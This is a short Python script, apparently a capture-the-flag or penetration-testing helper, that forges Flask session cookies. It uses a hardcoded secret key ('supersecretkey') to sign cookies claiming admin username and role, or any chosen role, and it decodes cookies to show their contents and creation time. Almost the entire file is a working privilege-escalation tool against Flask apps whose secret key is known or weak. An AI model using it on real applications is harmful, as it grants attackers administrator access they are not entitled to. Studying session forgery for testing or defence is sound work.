from flask.sessions import SecureCookieSessionInterface
from flask import Flask
import time
from itsdangerous import BadSignature

app = Flask(__name__)
app.secret_key = "supersecretkey"

class CustomSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, app):
        return super().get_signing_serializer(app)


# noinspection PyPep8Naming
class Cookie_Forger:

    @staticmethod
    def generate_cookie_admin():
        session_serializer = CustomSessionInterface().get_signing_serializer(app)

        session_data = {
            "username": "admin",
            "role": "admin",
        }

        cookie = session_serializer.dumps(session_data)
        return cookie

    @staticmethod
    def generate_cookie(username, role):
        session_serializer = CustomSessionInterface().get_signing_serializer(app)

        session_data = {
            "username": username,
            "role": role,
        }

        cookie = session_serializer.dumps(session_data)
        return cookie

    @staticmethod
    def inspect_cookie(cookie):
        serializer = CustomSessionInterface().get_signing_serializer(app)

        try:
            session_data, timestamp = serializer.loads(cookie, return_timestamp=True)
        except BadSignature as e:
            return f"Bad signature or invalid cookie: {e}"

        # timestamp is datetime.datetime, format it directly
        created_time = timestamp.strftime('%Y-%m-%d %H:%M:%S')

        return {
            "timestamp": timestamp,
            "created_time": created_time,
            "session_data": session_data,
        }


if __name__ == "__main__":
    print("Forged cookie:")
    cookie = Cookie_Forger.generate_cookie_admin()
    print(cookie)
    print(Cookie_Forger.inspect_cookie(cookie).get("created_time"))